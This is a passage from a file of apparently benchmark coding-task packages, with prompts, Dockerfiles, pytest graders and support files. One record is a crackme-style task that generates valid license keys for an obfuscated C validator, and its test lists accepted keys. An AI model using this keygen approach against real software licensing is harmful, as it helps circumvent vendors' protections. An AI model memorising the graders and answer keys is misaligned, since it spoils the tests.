(sum(n**2 for n in normal))**0.5\n            if length > 0:\n                normal = [n/length for n in normal]\n            \n            f.write(struct.pack('<fff', *normal))\n            \n            for vertex in tri:\n                f.write(struct.pack('<fff', *vertex))\n            \n            f.write(struct.pack('<H', 0))\n\ndef create_gear_stl():\n    header = b'Binary STL Gear' + b'\\0' * (80 - len('Binary STL Gear'))\n    \n    triangles = []\n    \n    # Create a simple gear-like shape with 8 teeth\n    import math\n    n_teeth = 8\n    inner_radius = 0.5\n    outer_radius = 1.0\n    \n    for i in range(n_teeth):\n        angle1 = (i * 2 * math.pi) / n_teeth\n        angle2 = ((i + 0.5) * 2 * math.pi) / n_teeth\n        angle3 = ((i + 1) * 2 * math.pi) / n_teeth\n        \n        # Tooth triangle\n        triangles.append([\n            [inner_radius * math.cos(angle1), inner_radius * math.sin(angle1), 0],\n            [outer_radius * math.cos(angle2), outer_radius * math.sin(angle2), 0],\n            [inner_radius * math.cos(angle3), inner_radius * math.sin(angle3), 0]\n        ])\n        \n        # Top face\n        triangles.append([\n            [inner_radius * math.cos(angle1), inner_radius * math.sin(angle1), 0.1],\n            [outer_radius * math.cos(angle2), outer_radius * math.sin(angle2), 0.1],\n            [inner_radius * math.cos(angle3), inner_radius * math.sin(angle3), 0.1]\n        ])\n    \n    with open('/workspace/gear.stl', 'wb') as f:\n        f.write(header)\n        f.write(struct.pack('<I', len(triangles)))\n        \n        for tri in triangles:\n            # Simple normal calculation\n            normal = [0, 0, 1] if tri[0][2] > 0 else [0, 0, -1]\n            \n            f.write(struct.pack('<fff', *normal))\n            \n            for vertex in tri:\n                f.write(struct.pack('<fff', *vertex))\n            \n            f.write(struct.pack('<H', 0))\n\ndef create_broken_stl():\n    header = b'Binary STL Broken' + b'\\0' * (80 - len('Binary STL Broken'))\n    \n    triangles = [\n        # Degenerate triangle (all vertices are the same)\n        [[0, 0, 0], [0, 0, 0], [0, 0, 0]],\n        # Normal triangle\n        [[0, 0, 0], [1, 0, 0], [0, 1, 0]],\n        # Another degenerate (collinear vertices)\n        [[0, 0, 0], [1, 0, 0], [2, 0, 0]],\n    ]\n    \n    with open('/workspace/broken.stl', 'wb') as f:\n        f.write(header)\n        f.write(struct.pack('<I', len(triangles)))\n        \n        for tri in triangles:\n            # Intentionally wrong normal for testing\n            normal = [0, 0, 0]  # Invalid zero-length normal\n            \n            f.write(struct.pack('<fff', *normal))\n            \n            for vertex in tri:\n                f.write(struct.pack('<fff', *vertex))\n            \n            f.write(struct.pack('<H', 0))\n\nif __name__ == \""__main__\"":\n    create_cube_stl()\n    create_gear_stl()\n    create_broken_stl()\n    print(\""STL files created successfully\"")""}",2025-07-22T11:53:59.532954+00:00,2025-07-22T11:53:59.570739+00:00
draft_dp_06e78829,extremely_hard,draft_dp_06e78829,data-processing,"Need to extract headers from these firmware images to identify partition offsets and sizes. Create a tool that outputs JSON with bootloader, kernel, and filesystem boundaries.",data-processing,binary-processing|python|data-extraction,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install required tools
RUN apt-get update && apt-get install -y \
    bsdmainutils \
    xxd \
    file \
    && rm -rf /var/lib/apt/lists/*

# Copy firmware generator
COPY generate_firmware.py /workspace/

# Generate firmware images
RUN python generate_firmware.py

# Set up working environment
RUN echo ""Firmware images available in firmware_images/"" > README.txt","import os
import json
import subprocess

def test_firmware_parser_extracts_partitions():
    """"""Test that the firmware parser correctly identifies partitions from both firmware images""""""
    # Test router firmware
    result = subprocess.run(['python', 'firmware_parser.py', 'firmware_images/router_firmware.bin'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, ""Parser should run successfully""
    
    data = json.loads(result.stdout)
    assert 'bootloader' in data, ""Should identify bootloader section""
    assert 'kernel' in data, ""Should identify kernel section""
    assert 'filesystem' in data, ""Should identify filesystem section""
    
    # Verify offsets are reasonable
    assert data['bootloader']['offset'] == 0, ""Bootloader should start at offset 0""
    assert data['kernel']['offset'] > 0, ""Kernel should have positive offset""
    assert data['filesystem']['offset'] > data['kernel']['offset'], ""Filesystem should come after kernel""
    
    # Test camera firmware
    result2 = subprocess.run(['python', 'firmware_parser.py', 'firmware_images/camera_firmware.bin'], 
                           capture_output=True, text=True)
    assert result2.returncode == 0, ""Parser should handle camera firmware""
    
    data2 = json.loads(result2.stdout)
    assert len(data2.get('partitions', [])) >= 3, ""Should identify at least 3 partitions in camera firmware""","{""test_firmware_parser_extracts_partitions"": 1.0}","{""generate_firmware.py"": ""#!/usr/bin/env python3\nimport struct\nimport zlib\nimport os\n\ndef create_uboot_header(size, load_addr=0x80008000, entry_addr=0x80008000, name=\""Linux Kernel\""):\n    \""\""\""Create a U-Boot image header\""\""\""\n    # U-Boot header format\n    magic = 0x27051956  # U-Boot magic number\n    hcrc = 0  # header crc (calculated later)\n    time = 0x60000000  # timestamp\n    size = size\n    load = load_addr\n    entry = entry_addr\n    dcrc = 0  # data crc (calculated later)\n    os_type = 5  # Linux\n    arch = 2  # ARM\n    image_type = 2  # Kernel\n    comp = 1  # gzip\n    name_bytes = name.encode('ascii')[:32].ljust(32, b'\\x00')\n    \n    # Pack header without CRC first\n    header = struct.pack('>IIIIIIII', magic, hcrc, time, size, load, entry, dcrc, os_type)\n    header += struct.pack('BBBB', arch, image_type, comp, 0)\n    header += name_bytes\n    \n    # Calculate header CRC (exclude magic and hcrc fields)\n    hcrc_data = header[8:]\n    hcrc = zlib.crc32(hcrc_data) & 0xffffffff\n    \n    # Repack with correct header CRC\n    header = struct.pack('>IIIIIIII', magic, hcrc, time, size, load, entry, dcrc, os_type)\n    header += struct.pack('BBBB', arch, image_type, comp, 0)\n    header += name_bytes\n    \n    return header\n\ndef create_squashfs_header():\n    \""\""\""Create a minimal SquashFS header\""\""\""\n    # SquashFS magic and basic header\n    magic = b'hsqs'  # little-endian SquashFS magic\n    inode_count = struct.pack('<I', 100)\n    mod_time = struct.pack('<I', 0x60000000)\n    block_size = struct.pack('<I', 131072)  # 128KB blocks\n    fragment_count = struct.pack('<I', 10)\n    compression = struct.pack('<H', 1)  # gzip\n    block_log = struct.pack('<H', 17)  # 2^17 = 128KB\n    flags = struct.pack('<H', 0)\n    no_ids = struct.pack('<H', 1)\n    major = struct.pack('<H', 4)\n    minor = struct.pack('<H', 0)\n    root_inode = struct.pack('<Q', 0x1000)\n    bytes_used = struct.pack('<Q', 0x100000)\n    id_table = struct.pack('<Q', 0x80000)\n    xattr_table = struct.pack('<Q', 0xffffffffffffffff)\n    inode_table = struct.pack('<Q', 0x1000)\n    dir_table = struct.pack('<Q', 0x2000)\n    frag_table = struct.pack('<Q', 0x3000)\n    export_table = struct.pack('<Q', 0xffffffffffffffff)\n    \n    header = magic + inode_count + mod_time + block_size + fragment_count\n    header += compression + block_log + flags + no_ids + major + minor\n    header += root_inode + bytes_used + id_table + xattr_table\n    header += inode_table + dir_table + frag_table + export_table\n    \n    return header\n\n# Create firmware images directory\nos.makedirs('firmware_images', exist_ok=True)\n\n# Generate router firmware with U-Boot + kernel + SquashFS\nprint(\""Generating router firmware...\"")\nkernel_data = b'KERNEL_DATA' * 10000  # Dummy kernel data\ncompressed_kernel = zlib.compress(kernel_data)\nuboot_header = create_uboot_header(len(compressed_kernel))\n\n# Add some padding between sections\npadding1 = b'\\xff' * 0x1000  # 4KB padding\n\nsquashfs_header = create_squashfs_header()\nsquashfs_data = b'ROOTFS_DATA' * 5000  # Dummy filesystem data\n\nwith open('firmware_images/router_firmware.bin', 'wb') as f:\n    # Bootloader at 0x0\n    f.write(b'BOOTLOADER' + b'\\x00' * 0x10000)  # 64KB bootloader\n    # U-Boot image at 0x10000\n    f.write(uboot_header)\n    f.write(compressed_kernel)\n    # Padding\n    f.write(padding1)\n    # SquashFS at aligned offset\n    current_pos = f.tell()\n    align_to = 0x10000  # 64KB alignment\n    padding_needed = (align_to - (current_pos % align_to)) % align_to\n    f.write(b'\\xff' * padding_needed)\n    # Write SquashFS\n    f.write(squashfs_header)\n    f.write(squashfs_data)\n\n# Generate IoT camera firmware with custom header\nprint(\""Generating IoT camera firmware...\"")\ncustom_magic = b'IOTC'\nversion = struct.pack('<I', 0x01020304)\nhw_id = b'CAM-2021'.ljust(16, b'\\x00')\npartition_count = struct.pack('<I', 3)\n\n# Partition entries\npart1_offset = struct.pack('<I', 0x1000)\npart1_size = struct.pack('<I', 0x10000)\npart1_type = struct.pack('<I', 1)  # bootloader\npart1_name = b'boot'.ljust(16, b'\\x00')\n\npart2_offset = struct.pack('<I', 0x20000)\npart2_size = struct.pack('<I', 0x100000)\npart2_type = struct.pack('<I', 2)  # kernel\npart2_name = b'kernel'.ljust(16, b'\\x00')\n\npart3_offset = struct.pack('<I', 0x120000)\npart3_size = struct.pack('<I', 0x200000)\npart3_type = struct.pack('<I', 3)  # rootfs\npart3_name = b'rootfs'.ljust(16, b'\\x00')\n\nwith open('firmware_images/camera_firmware.bin', 'wb') as f:\n    # Custom header\n    f.write(custom_magic)\n    f.write(version)\n    f.write(hw_id)\n    f.write(partition_count)\n    # Partition table\n    f.write(part1_offset + part1_size + part1_type + part1_name)\n    f.write(part2_offset + part2_size + part2_type + part2_name)\n    f.write(part3_offset + part3_size + part3_type + part3_name)\n    # Pad to first partition\n    current = f.tell()\n    f.write(b'\\x00' * (0x1000 - current))\n    # Write partitions\n    f.write(b'BOOT' * 0x4000)  # Boot partition\n    f.seek(0x20000)\n    f.write(b'KERN' * 0x40000)  # Kernel partition\n    f.seek(0x120000)\n    f.write(b'ROOT' * 0x80000)  # Rootfs partition\n\nprint(\""Firmware images generated successfully!\"")""}",2025-07-22T11:54:32.487308+00:00,2025-07-22T11:55:06.801533+00:00
draft_dp_3350782c,extremely_hard,draft_dp_3350782c,software-engineering,"Need a GraphQL complexity analyzer API on port 4000. POST /analyze-complexity should accept query + schema JSON, calculate complexity scores (field depth, list multipliers, resolver costs), and return detailed breakdown. Must handle fragments, aliases, variables, and reject queries over 1000 complexity.",software-engineering,api|python|web-server,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install dependencies
RUN pip install flask graphql-core requests

# Copy application files
COPY app.py /app/
COPY schema.graphql /app/
COPY test_queries.json /app/

# Expose the API port
EXPOSE 4000

CMD [""python"", ""app.py""]","import subprocess
import json
import time
import os

def test_simple_query_complexity():
    """"""Test basic complexity calculation for a simple query.""""""
    # Read schema
    with open('/app/schema.graphql', 'r') as f:
        schema = f.read()
    
    # Simple query with 2 fields at depth 1
    query = ""{ user(id: \""1\"") { name } }""
    
    payload = {
        ""query"": query,
        ""schema"": schema
    }
    
    # Make API request
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', 'http://localhost:4000/analyze-complexity',
         '-H', 'Content-Type: application/json',
         '-d', json.dumps(payload)],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    response = json.loads(result.stdout)
    
    # Should have calculated complexity score (2 fields: user + name)
    assert 'total_complexity' in response
    assert response['total_complexity'] > 0
    assert response['total_complexity'] == 2
    assert response['field_count'] == 2
    assert response['max_depth'] == 1

def test_nested_query_with_list_multipliers():
    """"""Test complexity calculation for nested queries with lists.""""""
    with open('/app/schema.graphql', 'r') as f:
        schema = f.read()
    
    # Nested query with lists - should have higher complexity
    query = """"""
    {
        user(id: ""1"") {
            posts(limit: 50) {
                comments(limit: 10) {
                    author {
                        name
                    }
                }
            }
        }
    }
    """"""
    
    payload = {
        ""query"": query,
        ""schema"": schema
    }
    
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', 'http://localhost:4000/analyze-complexity',
         '-H', 'Content-Type: application/json',
         '-d', json.dumps(payload)],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    response = json.loads(result.stdout)
    
    # Should handle depth and list multipliers properly
    assert 'total_complexity' in response
    assert response['total_complexity'] > 10  # Should be much higher due to lists
    assert response['max_depth'] == 4  # user -> posts -> comments -> author -> name
    assert 'list_multiplication_factor' in response
    assert response['list_multiplication_factor'] > 1

def test_complexity_threshold_rejection():
    """"""Test that queries exceeding complexity threshold are rejected.""""""
    with open('/app/schema.graphql', 'r') as f:
        schema = f.read()
    
    # Very complex query that should exceed threshold
    query = """"""
    {
        users(first: 100) {
            edges {
                node {
                    posts(limit: 100) {
                        comments(limit: 100) {
                            author {
                                followers(first: 100) {
                                    edges {
                                        node {
                                            posts(limit: 100) {
                                                title
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    """"""
    
    payload = {
        ""query"": query,
        ""schema"": schema
    }
    
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', 'http://localhost:4000/analyze-complexity',
         '-H', 'Content-Type: application/json',
         '-d', json.dumps(payload)],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    response = json.loads(result.stdout)
    
    # Should be rejected with 413 status (checking via response)
    assert 'error' in response
    assert 'complexity exceeds threshold' in response['error'].lower()","{""test_simple_query_complexity"": 0.3, ""test_nested_query_with_list_multipliers"": 0.5, ""test_complexity_threshold_rejection"": 0.2}","{""schema.graphql"": ""type Query {\n  user(id: ID!): User\n  users(first: Int, after: String): UserConnection!\n  posts(limit: Int = 10): [Post!]!\n}\n\ntype User {\n  id: ID!\n  name: String!\n  email: String!\n  posts(limit: Int = 20): [Post!]!\n  followers(first: Int): UserConnection!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n  comments(limit: Int = 50): [Comment!]!\n  likes: Int!\n}\n\ntype Comment {\n  id: ID!\n  text: String!\n  author: User!\n  post: Post!\n  replies: [Comment!]!\n}\n\ntype UserConnection {\n  edges: [UserEdge!]!\n  pageInfo: PageInfo!\n}\n\ntype UserEdge {\n  node: User!\n  cursor: String!\n}\n\ntype PageInfo {\n  hasNextPage: Boolean!\n  endCursor: String\n}"", ""app.py"": ""from flask import Flask, request, jsonify\nfrom graphql import parse, build_schema, validate\nfrom graphql.language import ast\n\napp = Flask(__name__)\n\ndef calculate_complexity(query_ast, schema):\n    return {\n        \""total_complexity\"": 0,\n        \""max_depth\"": 0,\n        \""field_count\"": 0,\n        \""list_multiplication_factor\"": 1,\n        \""operation_breakdown\"": {}\n    }\n\n@app.route('/analyze-complexity', methods=['POST'])\ndef analyze_complexity():\n    try:\n        data = request.get_json()\n        \n        if not data:\n            return jsonify({\""error\"": \""Invalid JSON payload\""}), 400\n            \n        query = data.get('query')\n        schema_str = data.get('schema')\n        \n        if not query:\n            return jsonify({\""error\"": \""Missing query field\""}), 400\n        if not schema_str:\n            return jsonify({\""error\"": \""Missing schema field\""}), 400\n            \n        # Parse query and schema\n        try:\n            query_ast = parse(query)\n            schema = build_schema(schema_str)\n        except Exception as e:\n            return jsonify({\""error\"": f\""Invalid GraphQL syntax: {str(e)}\""}), 400\n            \n        # Validate query against schema\n        errors = validate(schema, query_ast)\n        if errors:\n            return jsonify({\""error\"": f\""Query validation failed: {errors[0].message}\""}), 400\n            \n        # Calculate complexity\n        result = calculate_complexity(query_ast, schema)\n        \n        # Check complexity threshold\n        if result['total_complexity'] > 1000:\n            return jsonify({\""error\"": \""Query complexity exceeds threshold of 1000\""}), 413\n            \n        return jsonify(result)\n        \n    except Exception as e:\n        return jsonify({\""error\"": f\""Internal server error: {str(e)}\""}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=4000)"", ""test_queries.json"": ""{\n  \""simple_query\"": \""{ user(id: \\\""1\\\"") { name email } }\"",\n  \""nested_query\"": \""{ user(id: \\\""1\\\"") { posts { comments { author { name } } } } }\"",\n  \""list_query\"": \""{ users(first: 100) { edges { node { posts(limit: 50) { title } } } } }\"",\n  \""fragment_query\"": \""{ user(id: \\\""1\\\"") { ...userFields } } fragment userFields on User { name email posts { title } }\"",\n  \""complex_query\"": \""{ users(first: 100) { edges { node { name posts(limit: 50) { title comments(limit: 100) { text author { name followers(first: 10) { edges { node { name } } } } } } } } } }\""\n}""}",2025-07-22T11:55:50.077944+00:00,2025-07-22T18:00:12.666259+00:00
draft_dp_5653327f,medium,draft_dp_5653327f,software-engineering,Need a molecular mass calculator API on port 9090. GET /calculate-mass?formula=H2O should return the mass in amu with element breakdown. Handle nested parentheses like Fe2(SO4)3.,software-engineering,python|api|scientific-computation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY periodic_table.py /app/
COPY app.py /app/

RUN pip install flask

CMD [""python"", ""app.py""]","import subprocess
import json
import time

def test_basic_formulas():
    """"""Test calculation of basic chemical formulas.""""""
    # Test H2O
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:9090/calculate-mass?formula=H2O'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    data = json.loads(result.stdout)
    assert 'total_mass' in data
    assert abs(data['total_mass'] - 18.015) < 0.01
    assert data['breakdown']['H']['count'] == 2
    assert data['breakdown']['O']['count'] == 1
    
    # Test Ca(OH)2
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:9090/calculate-mass?formula=Ca(OH)2'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    data = json.loads(result.stdout)
    assert abs(data['total_mass'] - 74.093) < 0.01

def test_complex_nested_formula():
    """"""Test complex formula with nested parentheses.""""""
    # Test Fe2(SO4)3
    result = subprocess.run(
        ['curl', '-s', 'http://localhost:9090/calculate-mass?formula=Fe2(SO4)3'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    data = json.loads(result.stdout)
    assert abs(data['total_mass'] - 399.885) < 0.01
    assert data['breakdown']['Fe']['count'] == 2
    assert data['breakdown']['S']['count'] == 3
    assert data['breakdown']['O']['count'] == 12

def test_error_handling():
    """"""Test various error conditions.""""""
    # Missing formula parameter
    result = subprocess.run(
        ['curl', '-s', '-w', '\\n%{http_code}', 'http://localhost:9090/calculate-mass'],
        capture_output=True,
        text=True
    )
    lines = result.stdout.strip().split('\n')
    status_code = lines[-1]
    assert status_code == '400'
    
    # Invalid element
    result = subprocess.run(
        ['curl', '-s', '-w', '\\n%{http_code}', 'http://localhost:9090/calculate-mass?formula=Xx2O'],
        capture_output=True,
        text=True
    )
    lines = result.stdout.strip().split('\n')
    status_code = lines[-1]
    assert status_code == '400'
    
    # Empty formula
    result = subprocess.run(
        ['curl', '-s', '-w', '\\n%{http_code}', 'http://localhost:9090/calculate-mass?formula='],
        capture_output=True,
        text=True
    )
    lines = result.stdout.strip().split('\n')
    status_code = lines[-1]
    assert status_code == '400'","{""test_basic_formulas"": 0.4, ""test_complex_nested_formula"": 0.4, ""test_error_handling"": 0.2}","{""periodic_table.py"": ""# Atomic masses in amu\nPERIODIC_TABLE = {\n    'H': 1.008,\n    'C': 12.011,\n    'N': 14.007,\n    'O': 15.999,\n    'F': 18.998,\n    'Na': 22.990,\n    'Mg': 24.305,\n    'Al': 26.982,\n    'Si': 28.085,\n    'P': 30.974,\n    'S': 32.066,\n    'Cl': 35.453,\n    'K': 39.098,\n    'Ca': 40.078,\n    'Fe': 55.845,\n    'Cu': 63.546,\n    'Zn': 65.380,\n    'Br': 79.904,\n    'Ag': 107.868,\n    'I': 126.904\n}"", ""app.py"": ""from flask import Flask, request, jsonify\nfrom periodic_table import PERIODIC_TABLE\n\napp = Flask(__name__)\n\ndef parse_formula(formula):\n    \""\""\""Parse chemical formula and return element counts.\""\""\""\n    def parse_group(formula, start=0):\n        elements = {}\n        i = start\n        \n        while i < len(formula):\n            if formula[i] == '(':\n                # Find matching closing parenthesis\n                level = 1\n                j = i + 1\n                while j < len(formula) and level > 0:\n                    if formula[j] == '(':\n                        level += 1\n                    elif formula[j] == ')':\n                        level -= 1\n                    j += 1\n                \n                # Parse the group inside parentheses\n                group_elements = parse_group(formula, i + 1)[0]\n                \n                # Get the multiplier after the closing parenthesis\n                i = j\n                count = ''\n                while i < len(formula) and formula[i].isdigit():\n                    count += formula[i]\n                    i += 1\n                count = int(count) if count else 1\n                \n                # Add elements from the group\n                for element, element_count in group_elements.items():\n                    elements[element] = elements.get(element, 0) + element_count * count\n                    \n            elif formula[i] == ')':\n                # End of current group\n                return elements, i\n                \n            elif formula[i].isupper():\n                # Parse element symbol\n                element = formula[i]\n                i += 1\n                if i < len(formula) and formula[i].islower():\n                    element += formula[i]\n                    i += 1\n                \n                # Parse count\n                count = ''\n                while i < len(formula) and formula[i].isdigit():\n                    count += formula[i]\n                    i += 1\n                count = int(count) if count else 1\n                \n                elements[element] = elements.get(element, 0) + count\n            else:\n                i += 1\n        \n        return elements, i\n    \n    return parse_group(formula)[0]\n\n@app.route('/calculate-mass', methods=['GET'])\ndef calculate_mass():\n    formula = request.args.get('formula')\n    \n    if not formula:\n        return jsonify({'error': 'Missing formula parameter'}), 400\n    \n    if formula == '':\n        return jsonify({'error': 'Empty formula string'}), 400\n    \n    try:\n        elements = parse_formula(formula)\n        \n        # Calculate total mass\n        total_mass = 0\n        breakdown = {}\n        \n        for element, count in elements.items():\n            if element not in PERIODIC_TABLE:\n                return jsonify({'error': f'Invalid element symbol: {element}'}), 400\n            \n            mass = PERIODIC_TABLE[element] * count\n            total_mass += mass\n            breakdown[element] = {\n                'count': count,\n                'mass': mass\n            }\n        \n        return jsonify({\n            'formula': formula,\n            'total_mass': round(total_mass, 3),\n            'breakdown': breakdown\n        })\n    \n    except Exception as e:\n        return jsonify({'error': 'Malformed formula'}), 400\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9090)""}",2025-07-22T11:54:19.047771+00:00,2025-07-22T18:00:25.682321+00:00
draft_dp_8fb9caad,extremely_hard,draft_dp_8fb9caad,security,The license validator in validate.c is heavily obfuscated. Need to figure out what makes a valid license key using symbolic execution. Generate 5 valid keys to valid_keys.txt and create a clean Python version in deobfuscated_validator.py.,security,C|python|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install system packages
RUN apt-get update && apt-get install -y \
    gcc \
    make \
    build-essential \
    python3-dev \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages for symbolic execution
RUN pip install z3-solver angr

# Copy the obfuscated validator
COPY validate.c /app/
COPY Makefile /app/

# Compile the validator
RUN make

# Set up the working environment
RUN mkdir -p /app/work

WORKDIR /app/work","import os
import subprocess
import sys
import importlib.util

def test_valid_keys_generated():
    """"""Test that 5 valid license keys were generated.""""""
    assert os.path.exists('/app/work/valid_keys.txt'), ""valid_keys.txt not found""
    
    with open('/app/work/valid_keys.txt', 'r') as f:
        keys = [line.strip() for line in f if line.strip()]
    
    assert len(keys) == 5, f""Expected 5 keys, found {len(keys)}""
    
    # Test each key with the original validator
    for key in keys:
        result = subprocess.run(['/app/validate', key], 
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Key '{key}' was rejected by validator""

def test_deobfuscated_validator_works():
    """"""Test that the deobfuscated Python validator works correctly.""""""
    assert os.path.exists('/app/work/deobfuscated_validator.py'), ""deobfuscated_validator.py not found""
    
    # Import the deobfuscated validator dynamically
    sys.path.insert(0, '/app/work')
    import importlib.util
    spec = importlib.util.spec_from_file_location(""deobfuscated_validator"", ""/app/work/deobfuscated_validator.py"")
    deobfuscated_validator = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(deobfuscated_validator)
    
    # Test with a variety of keys to ensure correctness
    valid_keys = [
        ""XYZW-5555-A45"",
        ""XYZW-8840-A72"",
        ""XYZW-9920-A63"",
    ]
    
    invalid_keys = [
        ""ABCD-5555-A45"",
        ""XYZW-1111-A45"",
        ""XYZW-5555-B45"",
        ""XYZW-5555-A44"",
        ""XYZ-5555-A45"",
    ]
    
    # Test valid keys
    for key in valid_keys:
        assert deobfuscated_validator.validate_key(key) == True, f""Failed to validate valid key: {key}""
        # Also verify with C validator
        result = subprocess.run(['/app/validate', key], capture_output=True)
        assert result.returncode == 0, f""C validator rejected key that Python accepted: {key}""
    
    # Test invalid keys
    for key in invalid_keys:
        assert deobfuscated_validator.validate_key(key) == False, f""Incorrectly validated invalid key: {key}""
        # Also verify with C validator
        result = subprocess.run(['/app/validate', key], capture_output=True)
        assert result.returncode == 1, f""C validator accepted key that Python rejected: {key}""

def test_deobfuscated_is_simplified():
    """"""Test that the deobfuscated version is actually simplified.""""""
    with open('/app/work/deobfuscated_validator.py', 'r') as f:
        content = f.read()
    
    # Count non-empty, non-comment lines
    lines = content.split('\n')
    code_lines = [line for line in lines if line.strip() and not line.strip().startswith('#')]
    
    assert len(code_lines) < 50, f""Deobfuscated code has {len(code_lines)} lines, should be < 50""
    
    # Check that it has a validate_key function
    assert 'def validate_key(' in content, ""No validate_key function found""","{""test_valid_keys_generated"": 0.4, ""test_deobfuscated_validator_works"": 0.4, ""test_deobfuscated_is_simplified"": 0.2}","{""validate.c"": ""#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint validate_license(const char* key) {\n    int len = strlen(key);\n    int x1, x2, x3, x4, x5;\n    int t1, t2, t3, t4, t5, t6, t7, t8, t9, t10;\n    int r1, r2, r3, r4, r5;\n    \n    // Opaque predicate 1\n    if ((len * len - len) % 2 != 0) {\n        goto fail;\n    }\n    \n    // Check length with obfuscation\n    t1 = len << 2;\n    t2 = t1 >> 1;\n    t3 = t2 - 8;\n    t4 = t3 * 2;\n    t5 = t4 / 4;\n    if (t5 != 11) {\n        goto fail;\n    }\n    \n    // Dead code branch\n    if (len == 1337) {\n        x1 = 0xDEADBEEF;\n        x2 = x1 ^ 0xCAFEBABE;\n        goto fail;\n    }\n    \n    // Extract parts with obfuscation\n    x1 = (key[0] ^ 0x42) + 13;\n    x2 = (key[1] ^ 0x42) + 13;\n    x3 = (key[2] ^ 0x42) + 13;\n    x4 = (key[3] ^ 0x42) + 13;\n    x5 = key[4];\n    \n    // Complex constraint 1: First part must be \""XYZW\"" after transformation\n    t1 = x1 - 13;\n    t2 = t1 ^ 0x42;\n    r1 = (t2 == 'X') ? 1 : 0;\n    \n    t3 = x2 - 13;\n    t4 = t3 ^ 0x42;\n    r2 = (t4 == 'Y') ? 1 : 0;\n    \n    t5 = x3 - 13;\n    t6 = t5 ^ 0x42;\n    r3 = (t6 == 'Z') ? 1 : 0;\n    \n    t7 = x4 - 13;\n    t8 = t7 ^ 0x42;\n    r4 = (t8 == 'W') ? 1 : 0;\n    \n    // Opaque predicate 2\n    if ((r1 + r2 + r3 + r4) * 13 != 52) {\n        goto fail;\n    }\n    \n    // Check separator\n    if (x5 != '-') {\n        goto fail;\n    }\n    \n    // Dead code\n    for (int i = 0; i < 0; i++) {\n        x1 = x1 * x2 + x3;\n    }\n    \n    // Check numeric part (positions 5-8)\n    int sum = 0;\n    for (int i = 5; i < 9; i++) {\n        if (key[i] < '0' || key[i] > '9') {\n            goto fail;\n        }\n        sum += (key[i] - '0');\n    }\n    \n    // Obfuscated check: sum must be 20\n    t1 = sum * 5;\n    t2 = t1 / 2;\n    t3 = t2 * 4;\n    t4 = t3 / 10;\n    if (t4 != 20) {\n        goto fail;\n    }\n    \n    // Check last part starts with 'A'\n    r5 = key[9];\n    t9 = r5 - 65;\n    t10 = t9 * t9;\n    if (t10 != 0) {\n        goto fail;\n    }\n    \n    // Check last two chars are digits\n    if (key[10] < '0' || key[10] > '9') {\n        goto fail;\n    }\n    if (key[11] < '0' || key[11] > '9') {\n        goto fail;\n    }\n    \n    // Final check: last two digits sum to 9\n    int d1 = key[10] - '0';\n    int d2 = key[11] - '0';\n    t1 = d1 + d2;\n    t2 = t1 * 3;\n    t3 = t2 - 18;\n    t4 = t3 / 3;\n    t5 = t4 + 9;\n    if (t5 != 9) {\n        goto fail;\n    }\n    \n    // Success path\n    return 1;\n    \n    fail:\n    return 0;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        printf(\""Usage: %s <license_key>\\n\"", argv[0]);\n        return 1;\n    }\n    \n    if (validate_license(argv[1])) {\n        printf(\""Valid license key!\\n\"");\n        return 0;\n    } else {\n        printf(\""Invalid license key!\\n\"");\n        return 1;\n    }\n}"", ""Makefile"": ""CC = gcc\nCFLAGS = -Wall -O0\n\nvalidate: validate.c\n\t$(CC) $(CFLAGS) -o validate validate.c\n\nclean:\n\trm -f validate\n\n.PHONY: clean""}",2025-07-22T11:06:27.669911+00:00,2025-07-22T17:56:43.868128+00:00
draft_dp_328fd94b,hard,draft_dp_328fd94b,software-engineering,Someone deleted the feature/payment-service-grpc branch before we could merge it. It had our complete gRPC payment service implementation. Need to recover it - last updated 3 days ago.,software-engineering,git|debugging|file-recovery,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Go and dependencies
RUN apt-get update && apt-get install -y \
    golang-go \
    protobuf-compiler \
    protoc-gen-go \
    git \
    && rm -rf /var/lib/apt/lists/*

# Set up Go environment
ENV GOPATH=/go
ENV PATH=$GOPATH/bin:$PATH

# Install Go gRPC plugins
RUN go install google.golang.org/protobuf/cmd/protoc-gen-go@latest && \
    go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest

# Create workspace
WORKDIR /workspace

# Copy setup script and run it
COPY setup_repo.sh /tmp/
RUN chmod +x /tmp/setup_repo.sh && /tmp/setup_repo.sh && rm /tmp/setup_repo.sh

# Set working directory
WORKDIR /workspace","import subprocess
import os

def test_branch_recovered():
    """"""Test that the deleted branch has been recovered.""""""
    # Check if the feature branch exists
    result = subprocess.run(
        ['git', 'branch', '-a'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    
    # The branch should exist after recovery
    assert 'feature/payment-service-grpc' in result.stdout, ""Branch was not recovered""
    
    # Verify we can checkout to the branch
    checkout_result = subprocess.run(
        ['git', 'checkout', 'feature/payment-service-grpc'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    assert checkout_result.returncode == 0, ""Cannot checkout to recovered branch""

def test_grpc_implementation_present():
